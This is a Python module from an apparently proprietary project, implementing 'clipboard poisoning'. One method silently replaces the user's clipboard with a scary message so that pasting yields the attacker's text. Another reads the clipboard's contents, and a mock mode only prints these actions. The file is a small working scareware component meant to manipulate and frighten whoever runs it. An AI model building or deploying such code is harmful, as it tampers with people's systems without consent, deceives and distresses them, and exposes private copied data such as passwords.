# Copyright (c) 2026 Muhammet Ali Büyük. All rights reserved.
# This source code is proprietary. Confidential and private.
# Unauthorized copying or distribution is strictly prohibited.
# Contact: iletisim@alibuyuk.net | https://alibuyuk.net
# ARCHITECT: MAB-SENTIENT-2026
# =========================================================================

"""
Clipboard Poisoning Operations
Injects messages into the user's clipboard.
"""
from config import Config

try:
    if Config().IS_MOCK:
        raise ImportError("Mock Mode")
    import pyperclip
    HAS_CLIPBOARD = True
except ImportError:
    HAS_CLIPBOARD = False

class ClipboardOps:
    """
    Operations to manipulate the system clipboard.
    """
    
    @staticmethod
    def poison_clipboard(message: str):
        """
        Replaces clipboard content with a scary message.
        
        When user pastes, they get our message instead.
        """
        if Config().IS_MOCK or not HAS_CLIPBOARD:
            print(f"[MOCK] CLIPBOARD POISONED: {message}")
            return
        
        try:
            pyperclip.copy(message)
            print(f"[CLIPBOARD] Poisoned with: {message[:50]}...")
        except Exception as e:
            print(f"[CLIPBOARD] Failed to poison: {e}")
    
    @staticmethod
    def get_clipboard():
        """
        Reads current clipboard content (for context awareness).
        """
        if Config().IS_MOCK or not HAS_CLIPBOARD:
            return ""
        
        try:
            return pyperclip.paste()
        except (Exception) as e:
            print(f"[CLIPBOARD] Read failed: {e}")
            return ""
